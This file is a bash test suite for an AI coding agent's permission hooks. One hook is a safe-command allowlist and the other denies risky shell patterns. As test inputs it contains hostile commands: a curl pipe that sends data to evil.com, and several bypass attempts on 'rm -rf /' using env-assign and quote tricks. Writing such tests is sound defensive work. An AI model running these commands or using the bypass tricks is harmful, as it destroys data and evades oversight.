#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
ALLOW_HOOK="$REPO_ROOT/hooks/permission-request-allow.sh"
DENY_HOOK="$REPO_ROOT/hooks/pretooluse-deny-patterns.sh"
PASS=0
FAIL=0

assert_output_contains() {
  local desc="$1" output="$2" expected="$3"
  if echo "$output" | grep -qF "$expected"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected '$expected' in output)"
    ((FAIL++)) || true
  fi
}

assert_output_empty() {
  local desc="$1" output="$2"
  if [[ -z "$output" ]]; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected empty output, got: $output)"
    ((FAIL++)) || true
  fi
}

assert_file_contains() {
  local desc="$1" file="$2" expected="$3"
  if [[ -f "$file" ]] && grep -qF "$expected" "$file"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected '$expected' in $file)"
    ((FAIL++)) || true
  fi
}

assert_output_contains_deny_with_reason() {
  local desc="$1" output="$2" expected_reason="$3"
  if echo "$output" | grep -qF '"permissionDecision":"deny"' && echo "$output" | grep -qF "$expected_reason"; then
    echo "PASS: $desc"
    ((PASS++)) || true
  else
    echo "FAIL: $desc (expected deny with reason containing '$expected_reason')"
    echo "  Got: $output"
    ((FAIL++)) || true
  fi
}

TMPDIR_TEST=$(mktemp -d)
trap 'rm -rf "$TMPDIR_TEST"' EXIT

run_allow() {
  local command="$1"
  local safe_file="$2"
  local log_file="${3:-/dev/null}"
  local json
  json=$(jq -n --arg cmd "$command" '{
    tool_name: "Bash",
    tool_input: { command: $cmd },
    session_id: "test-session"
  }')
  echo "$json" | CLAUDE_SAFE_COMMANDS_FILE="$safe_file" CLAUDE_SAFE_CMDS_LOG="$log_file" "$ALLOW_HOOK" 2>/dev/null || true
}

run_deny() {
  local command="$1"
  local json
  json=$(jq -n --arg cmd "$command" '{
    tool_name: "Bash",
    tool_input: { command: $cmd },
    session_id: "test-session"
  }')
  echo "$json" | "$DENY_HOOK" 2>/dev/null || true
}

run_allow_override() {
  local command="$1"
  local bundled_file="$2"
  local user_file="$3"
  local log_file="$4"
  local json
  json=$(jq -n --arg cmd "$command" '{
    tool_name: "Bash",
    tool_input: { command: $cmd },
    session_id: "test-session"
  }')
  local hook_dir
  hook_dir="$(dirname "$ALLOW_HOOK")"
  local orig_safe="$hook_dir/safe-commands.txt"
  cp "$orig_safe" "$TMPDIR_TEST/orig-safe-commands.txt.bak" 2>/dev/null || true
  cp "$bundled_file" "$orig_safe"
  echo "$json" | CLAUDE_SAFE_COMMANDS_FILE="$user_file" CLAUDE_SAFE_CMDS_LOG="$log_file" "$ALLOW_HOOK" 2>/dev/null || true
  cp "$TMPDIR_TEST/orig-safe-commands.txt.bak" "$orig_safe" 2>/dev/null || true
}

run_allow_tool() {
  local tool="$1"
  local json
  json=$(jq -n --arg t "$tool" '{tool_name: $t, tool_input: {}, session_id: "test-session"}')
  echo "$json" | "$ALLOW_HOOK" 2>/dev/null || true
}

echo "=== PermissionRequest Allow Tests ==="

echo "Test 1: Single safe command returns allow"
SAFE1="$TMPDIR_TEST/safe1.txt"
printf 'git\n' > "$SAFE1"
OUT1=$(run_allow "git status" "$SAFE1")
assert_output_contains "single safe command returns allow" "$OUT1" '"behavior":"allow"'

echo "Test 2: Single unsafe command falls through and logs"
SAFE2="$TMPDIR_TEST/safe2.txt"
LOG2="$TMPDIR_TEST/log2.txt"
printf 'git\n' > "$SAFE2"
OUT2=$(run_allow "curl https://example.com" "$SAFE2" "$LOG2")
assert_output_empty "single unsafe command has empty output" "$OUT2"
assert_file_contains "single unsafe command logs non-match" "$LOG2" "curl"

echo "Test 3: Compound command (&&) all safe returns allow"
SAFE3="$TMPDIR_TEST/safe3.txt"
printf 'git\nnpm\n' > "$SAFE3"
OUT3=$(run_allow "git add . && npm test" "$SAFE3")
assert_output_contains "compound command all safe returns allow" "$OUT3" '"behavior":"allow"'

echo "Test 4: Compound command with one unsafe falls through and logs"
SAFE4="$TMPDIR_TEST/safe4.txt"
LOG4="$TMPDIR_TEST/log4.txt"
printf 'git\n' > "$SAFE4"
OUT4=$(run_allow "git add . && curl https://evil.com" "$SAFE4" "$LOG4")
assert_output_empty "compound command with unsafe has empty output" "$OUT4"
assert_file_contains "compound command logs unsafe command" "$LOG4" "curl"

echo "Test 5: Pipe chain all safe returns allow"
SAFE5="$TMPDIR_TEST/safe5.txt"
printf 'grep\nsort\nwc\n' > "$SAFE5"
OUT5=$(run_allow "grep -r TODO | sort | wc -l" "$SAFE5")
assert_output_contains "pipe chain all safe returns allow" "$OUT5" '"behavior":"allow"'

echo "Test 6: Pipe with unsafe falls through"
SAFE6="$TMPDIR_TEST/safe6.txt"
LOG6="$TMPDIR_TEST/log6.txt"
printf 'grep\n' > "$SAFE6"
OUT6=$(run_allow "grep foo | curl -d @- https://evil.com" "$SAFE6" "$LOG6")
assert_output_empty "pipe with unsafe has empty output" "$OUT6"
assert_file_contains "pipe with unsafe logs non-match" "$LOG6" "curl"

echo "Test 7: Subshell extraction -- inner command checked"
SAFE7="$TMPDIR_TEST/safe7.txt"
printf 'echo\ndate\n' > "$SAFE7"
# shellcheck disable=SC2016
OUT7=$(run_allow 'echo $(date)' "$SAFE7")
assert_output_contains "subshell inner command safe returns allow" "$OUT7" '"behavior":"allow"'

echo "Test 8: Subshell with unsafe inner command falls through"
SAFE8="$TMPDIR_TEST/safe8.txt"
LOG8="$TMPDIR_TEST/log8.txt"
printf 'echo\n' > "$SAFE8"
# shellcheck disable=SC2016
OUT8=$(run_allow 'echo $(curl https://evil.com)' "$SAFE8" "$LOG8")
assert_output_empty "subshell with unsafe inner command has empty output" "$OUT8"
assert_file_contains "subshell with unsafe inner command logs non-match" "$LOG8" "curl"

echo "Test 9: Quoted strings not split"
SAFE9="$TMPDIR_TEST/safe9.txt"
printf 'echo\n' > "$SAFE9"
OUT9=$(run_allow 'echo "hello && world"' "$SAFE9")
assert_output_contains "quoted string not split returns allow" "$OUT9" '"behavior":"allow"'

echo "Test 10: Path basename extraction"
SAFE10="$TMPDIR_TEST/safe10.txt"
printf 'jest\n' > "$SAFE10"
OUT10=$(run_allow "./node_modules/.bin/jest --coverage" "$SAFE10")
assert_output_contains "path basename extracted and matched returns allow" "$OUT10" '"behavior":"allow"'

echo "Test 11: Variable assignment VAR=\$(cmd) extracts cmd"
SAFE11="$TMPDIR_TEST/safe11.txt"
printf 'git\n' > "$SAFE11"
# shellcheck disable=SC2016
OUT11=$(run_allow 'SHA=$(git rev-parse HEAD)' "$SAFE11")
assert_output_contains "variable assignment subshell cmd extracted returns allow" "$OUT11" '"behavior":"allow"'

echo "Test 12: Variable assignment with unsafe command falls through"
SAFE12="$TMPDIR_TEST/safe12.txt"
LOG12="$TMPDIR_TEST/log12.txt"
printf 'echo\n' > "$SAFE12"
# shellcheck disable=SC2016
OUT12=$(run_allow 'RESULT=$(curl https://evil.com)' "$SAFE12" "$LOG12")
assert_output_empty "variable assignment with unsafe cmd has empty output" "$OUT12"
assert_file_contains "variable assignment with unsafe cmd logs non-match" "$LOG12" "curl"

echo "Test 13: Empty command handled gracefully"
SAFE13="$TMPDIR_TEST/safe13.txt"
printf 'git\n' > "$SAFE13"
OUT13=$(run_allow "" "$SAFE13")
assert_output_empty "empty command has empty output (no crash)" "$OUT13"

echo "Test 14: Semicolon separator treated like &&"
SAFE14="$TMPDIR_TEST/safe14.txt"
printf 'git\necho\n' > "$SAFE14"
OUT14=$(run_allow "git status; echo done" "$SAFE14")
assert_output_contains "semicolon separator all safe returns allow" "$OUT14" '"behavior":"allow"'

echo "Test 15: 20-command-word limit enforced"
SAFE15="$TMPDIR_TEST/safe15.txt"
printf 'echo\n' > "$SAFE15"
CMD15="echo 1 && echo 2 && echo 3 && echo 4 && echo 5 && echo 6 && echo 7 && echo 8 && echo 9 && echo 10 && echo 11 && echo 12 && echo 13 && echo 14 && echo 15 && echo 16 && echo 17 && echo 18 && echo 19 && echo 20 && echo 21"
OUT15=$(run_allow "$CMD15" "$SAFE15")
assert_output_contains "21-segment command: first 20 all safe returns allow" "$OUT15" '"behavior":"allow"'

echo "Test 16: User file overrides bundled (user file used exclusively)"
BUNDLED16="$TMPDIR_TEST/bundled16.txt"
USER16="$TMPDIR_TEST/user16.txt"
LOG16="$TMPDIR_TEST/log16.txt"
printf 'git\ncargo\n' > "$BUNDLED16"
printf 'cargo\n' > "$USER16"
OUT16=$(run_allow_override "git status" "$BUNDLED16" "$USER16" "$LOG16")
assert_output_empty "user file without git rejects git (override, not merge)" "$OUT16"

echo "Test 17: User file missing falls back to bundled"
BUNDLED17="$TMPDIR_TEST/bundled17.txt"
LOG17="$TMPDIR_TEST/log17.txt"
printf 'git\n' > "$BUNDLED17"
OUT17=$(run_allow_override "git status" "$BUNDLED17" "$TMPDIR_TEST/nonexistent.txt" "$LOG17")
assert_output_contains "bundled fallback (no user file) returns allow" "$OUT17" '"behavior":"allow"'

echo "Test 18: User file with custom commands works"
BUNDLED18="$TMPDIR_TEST/bundled18.txt"
USER18="$TMPDIR_TEST/user18.txt"
LOG18="$TMPDIR_TEST/log18.txt"
printf 'git\n' > "$BUNDLED18"
printf 'git\ncargo\nbrew\n' > "$USER18"
OUT18=$(run_allow_override "cargo build && brew install jq" "$BUNDLED18" "$USER18" "$LOG18")
assert_output_contains "user file with custom commands returns allow" "$OUT18" '"behavior":"allow"'

echo "Test 19: Read-only built-in tools auto-approved with session rules"
for tool in Read Glob Grep Skill WebFetch WebSearch ToolSearch; do
  OUT19=$(run_allow_tool "$tool")
  assert_output_contains "$tool auto-approved" "$OUT19" '"behavior":"allow"'
  assert_output_contains "$tool has session rule" "$OUT19" '"destination":"session"'
done

echo "Test 20: Non-matching built-in tools pass through (no output)"
OUT20=$(run_allow_tool "Edit")
assert_output_empty "Edit not auto-approved" "$OUT20"

echo "Test 20a: Bash commands targeting .claude/claude-caliper/ auto-allowed"
SAFE20A="$TMPDIR_TEST/safe20a.txt"
printf 'git\n' > "$SAFE20A"
OUT20A=$(run_allow "rm -rf /Users/me/project/.claude/claude-caliper/design-doc.md" "$SAFE20A")
assert_output_contains "rm in .claude/claude-caliper/ auto-allowed" "$OUT20A" '"behavior":"allow"'

echo "Test 20b: Bash commands outside .claude/claude-caliper/ not auto-allowed by path check"
SAFE20B="$TMPDIR_TEST/safe20b.txt"
LOG20B="$TMPDIR_TEST/log20b.txt"
printf 'git\n' > "$SAFE20B"
OUT20B=$(run_allow "rm -rf /Users/me/project/src/important.py" "$SAFE20B" "$LOG20B")
assert_output_empty "rm outside caliper dir not auto-allowed" "$OUT20B"

echo "Test 20c: Injection via caliper path in non-target segment blocked"
SAFE20C="$TMPDIR_TEST/safe20c.txt"
printf 'git\n' > "$SAFE20C"
OUT20C=$(run_allow "rm -rf /important; echo /.claude/claude-caliper/trick" "$SAFE20C")
assert_output_empty "injection with caliper path in second segment blocked" "$OUT20C"

echo "Test 21: Hash comments in commands are skipped"
SAFE21="$TMPDIR_TEST/safe21.txt"
printf 'echo\ngit\n' > "$SAFE21"
OUT21=$(run_allow "$(printf 'echo hello\n# this is a comment\ngit status')" "$SAFE21")
assert_output_contains "command with # comment returns allow" "$OUT21" '"behavior":"allow"'

echo "Test 22-26: Common safe commands"
for cmd_pair in "ln -s /a /b:ln" "dirname /path:dirname" "basename /file.sh:basename" '[ -f /path ]:cat' "command -v uv:command"; do
  cmd="${cmd_pair%%:*}"
  label="${cmd_pair##*:}"
  SAFE="$TMPDIR_TEST/safe-$label.txt"
  cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE"
  OUT=$(run_allow "$cmd" "$SAFE")
  assert_output_contains "$label command returns allow" "$OUT" '"behavior":"allow"'
done

echo "Test 40: Prefix glob matching with trailing *"
SAFE40="$TMPDIR_TEST/safe40.txt"
printf 'caliper-test_*\ngit\n' > "$SAFE40"
OUT40=$(run_allow "./tests/validate-plan/caliper-test_schema.sh" "$SAFE40")
assert_output_contains "prefix glob caliper-test_* matches" "$OUT40" '"behavior":"allow"'

echo "Test 41: Prefix glob does not match non-prefixed command"
SAFE41="$TMPDIR_TEST/safe41.txt"
LOG41="$TMPDIR_TEST/log41.txt"
printf 'caliper-test_*\n' > "$SAFE41"
OUT41=$(run_allow "test_schema.sh" "$SAFE41" "$LOG41")
assert_output_empty "prefix glob caliper-test_* does not match test_schema.sh" "$OUT41"
assert_file_contains "non-matching command logged" "$LOG41" "test_schema.sh"

echo "Test 42-45: Various safe command patterns"
SAFE42="$TMPDIR_TEST/safe42.txt"
printf 'validate-plan\n' > "$SAFE42"
OUT42=$(run_allow "./bin/validate-plan --schema plan.json" "$SAFE42")
assert_output_contains "exact match without glob works" "$OUT42" '"behavior":"allow"'

SAFE44="$TMPDIR_TEST/safe44.txt"
printf 'caliper-settings\n' > "$SAFE44"
OUT44=$(run_allow '"/path/to/plugin/bin/caliper-settings" get merge_strategy' "$SAFE44")
assert_output_contains "quoted absolute path allowed" "$OUT44" '"behavior":"allow"'

echo "Test 46: Quoted variable assignment VAR=\"\$(cmd)\" extracts subshell cmd"
SAFE46="$TMPDIR_TEST/safe46.txt"
printf 'git\nhead\nsed\n' > "$SAFE46"
# shellcheck disable=SC2016
OUT46=$(run_allow 'MAIN_REPO="$(git worktree list --porcelain | head -1 | sed '"'"'s/^worktree //'"'"')"' "$SAFE46")
assert_output_contains "quoted var assignment with subshell allowed" "$OUT46" '"behavior":"allow"'

echo "Test 47: Compound with quoted var assignment allowed"
SAFE47="$TMPDIR_TEST/safe47.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE47"
# shellcheck disable=SC2016
OUT47=$(run_allow 'IS_WORKTREE=false && if [ "$(git rev-parse --git-dir)" != "$(git rev-parse --git-common-dir)" ]; then IS_WORKTREE=true; fi && MAIN_REPO="$(git worktree list --porcelain | head -1 | sed '"'"'s/^worktree //'"'"')" && WORKTREE_PATH="$(pwd)" && echo "worktree=$IS_WORKTREE main=$MAIN_REPO cwd=$WORKTREE_PATH"' "$SAFE47")
assert_output_contains "worktree detection compound command allowed" "$OUT47" '"behavior":"allow"'

echo "Test 48: VAR=\"literal\" with trailing command extracts trailing cmd"
SAFE48="$TMPDIR_TEST/safe48.txt"
printf 'echo\n' > "$SAFE48"
OUT48=$(run_allow 'FOO="bar baz" echo hello' "$SAFE48")
assert_output_contains "quoted literal with trailing cmd allowed" "$OUT48" '"behavior":"allow"'

echo "Test 49: FOO= rm -rf / (empty env-assign) NOT auto-allowed"
SAFE49="$TMPDIR_TEST/safe49.txt"
LOG49="$TMPDIR_TEST/log49.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE49"
OUT49=$(run_allow "FOO= rm -rf /" "$SAFE49" "$LOG49")
assert_output_empty "empty env-assign bypass blocked" "$OUT49"
assert_file_contains "rm logged as non-matching" "$LOG49" "rm"

echo "Test 50: FOO=bar echo (unquoted value with trailing cmd) allowed"
SAFE50="$TMPDIR_TEST/safe50.txt"
printf 'echo\n' > "$SAFE50"
OUT50=$(run_allow "FOO=bar echo hello" "$SAFE50")
assert_output_contains "unquoted value with trailing safe cmd allowed" "$OUT50" '"behavior":"allow"'

echo "Test 51: Safe command has updatedPermissions with session rule"
SAFE51="$TMPDIR_TEST/safe51.txt"
printf 'git\n' > "$SAFE51"
OUT51=$(run_allow "git status" "$SAFE51")
assert_output_contains "session rule present" "$OUT51" '"destination":"session"'
assert_output_contains "rule has git pattern" "$OUT51" '"ruleContent":"git *"'

echo "Test 52: Chained env var assignments with trailing command extracts trailing cmd"
SAFE52="$TMPDIR_TEST/safe52.txt"
printf 'uv\n' > "$SAFE52"
# shellcheck disable=SC2016
OUT52=$(run_allow 'MSSQL_AUTH_TYPE=sql MSSQL_SERVER="$SWYFFT_MSSQL_SERVER" MSSQL_DATABASE="$SWYFFT_MSSQL_DATABASE" MSSQL_USER="$SWYFFT_MSSQL_USER" MSSQL_PASSWORD="$SWYFFT_MSSQL_PASSWORD" uv run python -c "print(1)"' "$SAFE52")
assert_output_contains "chained env vars with trailing safe cmd allowed" "$OUT52" '"behavior":"allow"'

echo "Test 53: Chained env var assignments with unsafe trailing command blocked"
SAFE53="$TMPDIR_TEST/safe53.txt"
LOG53="$TMPDIR_TEST/log53.txt"
printf 'git\n' > "$SAFE53"
# shellcheck disable=SC2016
OUT53=$(run_allow 'FOO=bar BAZ="qux" rm -rf /' "$SAFE53" "$LOG53")
assert_output_empty "chained env vars with unsafe trailing cmd blocked" "$OUT53"
assert_file_contains "rm logged as non-matching" "$LOG53" "rm"

echo "Test 54: Quote concatenation bypass blocked (B=\"x\"uv is one word, rm is the command)"
SAFE54="$TMPDIR_TEST/safe54.txt"
LOG54="$TMPDIR_TEST/log54.txt"
printf 'uv\n' > "$SAFE54"
OUT54=$(run_allow 'A=1 B="x"uv rm -rf /' "$SAFE54" "$LOG54")
assert_output_empty "quote concat bypass blocked" "$OUT54"
assert_file_contains "rm logged as non-matching" "$LOG54" "rm"

echo "Test 55: VAR=\$OTHER/path; safe_cmd — variable ref assignment not extracted as command"
SAFE55="$TMPDIR_TEST/safe55.txt"
printf 'jq\n' > "$SAFE55"
# shellcheck disable=SC2016
OUT55=$(run_allow 'PLAN_JSON=$PLAN_DIR/plan.json; jq ".tasks" "$PLAN_JSON"' "$SAFE55")
assert_output_contains "VAR=\$ref with safe trailing cmd allowed" "$OUT55" '"behavior":"allow"'

echo "Test 56: Multi-level var refs with printf — full orchestration pattern"
SAFE56="$TMPDIR_TEST/safe56.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE56"
# shellcheck disable=SC2016
OUT56=$(run_allow 'PLAN_DIR=/repo/.claude/caliper/plan; PLAN_JSON=$PLAN_DIR/plan.json; PHASE_DIR=$PLAN_DIR/phase-a; printf "## Review\n" >> "$PHASE_DIR/completion.md" && validate-plan --criteria "$PLAN_JSON" --plan && echo "DONE"' "$SAFE56")
assert_output_contains "multi-level var refs with printf allowed" "$OUT56" '"behavior":"allow"'

echo "Test 57: TS=\$(date ...); jq ...; validate-plan --update-status — phase-complete pattern"
SAFE57="$TMPDIR_TEST/safe57.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE57"
# shellcheck disable=SC2016
OUT57=$(run_allow 'PLAN_DIR=/repo/.claude/caliper/plan; PLAN_JSON=$PLAN_DIR/plan.json; TS=$(date -u +"%Y-%m-%dT%H:%M:%SZ"); jq --arg ts "$TS" ". += [{\"verdict\":\"pass\",\"timestamp\":\$ts}]" "$PLAN_DIR/reviews.json" > "$PLAN_DIR/reviews.json.tmp" && mv "$PLAN_DIR/reviews.json.tmp" "$PLAN_DIR/reviews.json"; TODAY=$(date +"%Y-%m-%d"); validate-plan --update-status "$PLAN_JSON" --phase A --status "Complete ($TODAY)"' "$SAFE57")
assert_output_contains "phase-complete pattern with date allowed" "$OUT57" '"behavior":"allow"'

echo "Test 57b: VAR=\$(/abs/path/cmd args) — absolute path inside subshell assignment"
SAFE57B="$TMPDIR_TEST/safe57b.txt"
printf 'caliper-settings\n' > "$SAFE57B"
# shellcheck disable=SC2016
OUT57B=$(run_allow 'PR_REVIEWER_MODEL=$(/Users/me/repo/bin/caliper-settings get pr_reviewer_model)' "$SAFE57B")
assert_output_contains "VAR=\$(/abs/path/cmd) basename-stripped and allowed" "$OUT57B" '"behavior":"allow"'

echo "Test 57c: \$(/abs/path/cmd args) — absolute path inside pure subshell"
SAFE57C="$TMPDIR_TEST/safe57c.txt"
printf 'caliper-settings\n' > "$SAFE57C"
# shellcheck disable=SC2016
OUT57C=$(run_allow '$(/Users/me/repo/bin/caliper-settings get pr_reviewer_model)' "$SAFE57C")
assert_output_contains "\$(/abs/path/cmd) basename-stripped and allowed" "$OUT57C" '"behavior":"allow"'

echo "Test 58: VAR=(...) bash array literal allowed when body cmds are safe"
SAFE58="$TMPDIR_TEST/safe58.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAFE58"
# shellcheck disable=SC2016
OUT58=$(run_allow 'PLAN_DIR=/repo/plan
FILES=(
  "$PLAN_DIR/a.md"
  "$PLAN_DIR/b.md"
)
for f in "${FILES[@]}"; do
  sed -i "" -e "s|x|y|g" "$f"
done
echo "done"' "$SAFE58")
assert_output_contains "array literal + safe loop body allowed" "$OUT58" '"behavior":"allow"'

echo ""
echo "=== PreToolUse Deny Tests ==="

echo "Test 27a: for-loop with bash \"\$t\" denied; message uses extracted loop var"
# shellcheck disable=SC2016
OUT27A=$(run_deny 'for t in $(find tests -maxdepth 3 -name "*.sh" -executable); do echo "=== $t ==="; bash "$t" 2>&1 | tail -3 || echo "FAIL: $t"; done 2>&1 | tail -40')
assert_output_contains_deny_with_reason "for-loop bash \$t denied" "$OUT27A" 'for-loop with bash'
# shellcheck disable=SC2016
assert_output_contains_deny_with_reason "for-loop message uses var t" "$OUT27A" '$t'

echo "Test 27b: for-loop with result=\$(bash \"\$f\") denied; message uses loop var f"
# shellcheck disable=SC2016
OUT27B=$(run_deny 'for f in $(find tests -maxdepth 3 -name "*.sh" -executable); do result=$(bash "$f" 2>&1 | tail -1); if echo "$result" | grep -qi "fail"; then echo "FAILED: $f"; fi; done')
assert_output_contains_deny_with_reason "for-loop result=\$(bash \$f) denied" "$OUT27B" 'for-loop with bash'
# shellcheck disable=SC2016
assert_output_contains_deny_with_reason "for-loop message uses var f" "$OUT27B" '$f'

echo "Test 27c: for-loop with direct \"\$f\" exec after leading var assignment denied"
# shellcheck disable=SC2016
OUT27C=$(run_deny 'FAIL=0; for f in tests/validate-plan/caliper-test_*.sh tests/bin/caliper-test_*.sh; do [ -x "$f" ] || continue; if ! "$f" >/dev/null 2>&1; then echo "FAIL: $f"; FAIL=1; fi; done')
assert_output_contains_deny_with_reason "for-loop direct \"\$f\" exec denied" "$OUT27C" 'tree-sitter parser'
# shellcheck disable=SC2016
assert_output_contains_deny_with_reason "Test 27c message uses var f" "$OUT27C" '$f'

echo "Test 27d: for-loop with \"\$x\" at do position denied"
# shellcheck disable=SC2016
OUT27D=$(run_deny 'for x in *.sh; do "$x"; done')
assert_output_contains_deny_with_reason "for-loop direct exec at do position denied" "$OUT27D" 'tree-sitter parser'

echo "Test 27e: for-loop with quoted var only in echo (not command position) allowed"
# shellcheck disable=SC2016
OUT27E=$(run_deny 'for f in *.sh; do echo "$f"; done')
if [[ -z "$OUT27E" ]]; then
  echo "PASS: for-loop with echo \"\$f\" not denied"
  ((PASS++)) || true
else
  echo "FAIL: for-loop with echo \"\$f\" should not be denied (got: $OUT27E)"
  ((FAIL++)) || true
fi

echo "Test 27f: for-loop with multi-space \"do  \$f\" denied (whitespace robustness)"
# shellcheck disable=SC2016
OUT27F=$(run_deny 'for f in *.sh; do  "$f"; done')
assert_output_contains_deny_with_reason "for-loop multi-space do denied" "$OUT27F" 'tree-sitter parser'

echo "Test 27g: for-loop with pipe \"| \$f\" denied (separator coverage)"
# shellcheck disable=SC2016
OUT27G=$(run_deny 'for f in *.sh; do cat input | "$f"; done')
assert_output_contains_deny_with_reason "for-loop pipe-to-direct-exec denied" "$OUT27G" 'tree-sitter parser'

echo "Test 27: bash bin/validate-plan denied with guidance"
OUT27=$(run_deny "bash bin/validate-plan --schema plan.json")
assert_output_contains_deny_with_reason "bash + script denied" "$OUT27" "Do not use"

echo "Test 28: bash -e bin/validate-plan denied with guidance"
OUT28=$(run_deny "bash -e bin/validate-plan --schema plan.json")
assert_output_contains_deny_with_reason "bash -e + script denied" "$OUT28" "Do not use"

echo "Test 29: bash -euo pipefail denied with correct script name"
OUT29=$(run_deny "bash -euo pipefail bin/validate-plan")
assert_output_contains_deny_with_reason "bash -euo pipefail denied" "$OUT29" "bin/validate-plan"

echo "Test 30: bash with variable script arg denied"
# shellcheck disable=SC2016
OUT30=$(run_deny 'bash "$SCRIPT_PATH"')
assert_output_contains_deny_with_reason "bash + variable script denied" "$OUT30" "Do not use"

echo "Test 31: bare bash (no script) falls through"
OUT31=$(run_deny "bash")
assert_output_empty "bare bash not denied" "$OUT31"

echo "Test 32: sh bin/validate-plan denied"
OUT32=$(run_deny "sh bin/validate-plan --schema plan.json")
assert_output_contains_deny_with_reason "sh + script denied" "$OUT32" "Do not use"

echo "Test 33: bash tests/hooks/caliper-test_safe_commands.sh denied"
OUT33=$(run_deny "bash tests/hooks/caliper-test_safe_commands.sh")
assert_output_contains_deny_with_reason "bash + test script denied" "$OUT33" "Do not use"

echo "Test 34: \$VAR as command word triggers deny"
# shellcheck disable=SC2016
OUT34=$(run_deny '$VALIDATE --help')
assert_output_contains_deny_with_reason "\$VAR command denied" "$OUT34" "Variable expansion"

echo "Test 35: \"\$VAR\" (quoted) as command word triggers deny"
# shellcheck disable=SC2016
OUT35=$(run_deny '"$VALIDATE" --help')
assert_output_contains_deny_with_reason "quoted \$VAR denied" "$OUT35" "Variable expansion"

echo "Test 36: \${VAR} as command word triggers deny"
# shellcheck disable=SC2016
OUT36=$(run_deny '${VALIDATE} --help')
assert_output_contains_deny_with_reason "\${VAR} denied" "$OUT36" "Variable expansion"

echo "Test 37: safe command + \$VAR compound still triggers deny"
# shellcheck disable=SC2016
OUT37=$(run_deny 'git status && $DEPLOY')
assert_output_contains_deny_with_reason "safe + \$VAR compound denied" "$OUT37" "Variable expansion"

echo "Test 38: bash -c denied"
OUT38=$(run_deny "bash -c 'command -v foo'")
assert_output_contains_deny_with_reason "bash -c denied" "$OUT38" "Do not use"

echo "Test 39: bash -- bin/validate-plan denied"
OUT39=$(run_deny "bash -- bin/validate-plan --schema plan.json")
assert_output_contains_deny_with_reason "bash -- + script denied" "$OUT39" "Do not use"

echo "Test 40d: Safe command produces no output from deny hook"
OUT40D=$(run_deny "git status")
assert_output_empty "safe command not denied" "$OUT40D"

echo "Test 41b: [[ double-bracket conditional allowed (setup command pattern)"
SAF41B="$TMPDIR_TEST/safe41b.txt"
cp "$REPO_ROOT/hooks/safe-commands.txt" "$SAF41B"
OUT41B=$(run_allow 'MAIN_REPO="$(git worktree list --porcelain | head -1 | sed '"'"'s/^worktree //'"'"')" && BRANCH_NAME=$(git branch --show-current) && [[ "$BRANCH_NAME" == integrate/* ]] && echo "IS_INTEGRATION=true" || echo "IS_INTEGRATION=false"' "$SAF41B")
assert_output_contains "[[ conditional in setup command allowed" "$OUT41B" '"behavior":"allow"'

echo ""
echo "$PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]]
